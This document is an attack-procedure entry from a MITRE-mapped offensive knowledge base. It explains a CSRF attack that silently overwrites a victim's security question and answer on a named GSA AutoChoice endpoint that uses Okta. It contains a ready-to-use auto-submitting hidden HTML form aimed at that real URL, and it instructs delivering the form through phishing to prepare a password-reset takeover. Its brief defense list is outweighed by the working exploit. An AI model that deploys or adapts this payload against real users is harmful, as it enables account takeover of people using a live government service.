---
tags:
  - csrf
  - okta
  - web
type: procedure
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:33:12.427Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: adff919f-ea7d-41c9-b7b9-163057869d55
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# CSRF-Update-Secret-Answer

## Summary

This procedure exploits the absence of CSRF protection on the security question change endpoint to unauthorizedly update a victim's secret answer, setting the stage for further account compromise in Okta-integrated applications.

## Description

In scenarios where web applications like the GSA AutoChoice system use Okta for authentication but fail to implement server-side CSRF token validation, an attacker can craft forged POST requests from a malicious page loaded in the victim's browser. While the victim is authenticated, the browser automatically includes session cookies, allowing the request to succeed as if initiated by the user. This updates the security question and answer without their knowledge, using hidden form fields in HTML. The target endpoint is https://autochoice.fas.gsa.gov/AutoChoice/changeQAOktaAnswer, which does not require knowledge of the original question as the new one overwrites it.

## Requirements

1. Victim authenticated to the target site in their browser
2. Ability to host or deliver a malicious HTML file (e.g., via email link or compromised site)
3. Knowledge of desired new question and answer values

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens with server-side validation on all state-changing endpoints
- Use SameSite=Strict cookies to prevent cross-site requests
- Monitor for anomalous form submissions from unusual referers

## Objectives

1. Unauthorized modification of security credentials
2. Preparation for password reset exploitation
3. Maintain stealth by avoiding direct credential theft

## Instructions

### Step 1: Craft Malicious HTML Form

**Context**: Create a form that mimics the legitimate POST request to the endpoint, hiding the inputs to avoid user detection.

No command; use HTML editor or text file:

```html
<form id="updateQA" action="https://autochoice.fas.gsa.gov/AutoChoice/changeQAOktaAnswer" method="POST">
  <input type="hidden" name="question" value="What is your pet's name?">
  <input type="hidden" name="answer" value="attacker_knows_this">
</form>
<script>document.getElementById('updateQA').submit();</script>
```

> This auto-submits the form on page load, sending the POST with session cookies.

### Step 2: Deliver and Execute

**Context**: Trick the victim into loading the HTML while authenticated.

Host the file (e.g., on a web server) and send the URL via phishing. Monitor network traffic in browser dev tools to confirm submission.

> Expected: 200 OK response or redirect; check for success indicators like updated profile on re-login.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- csrf
- account-takeover
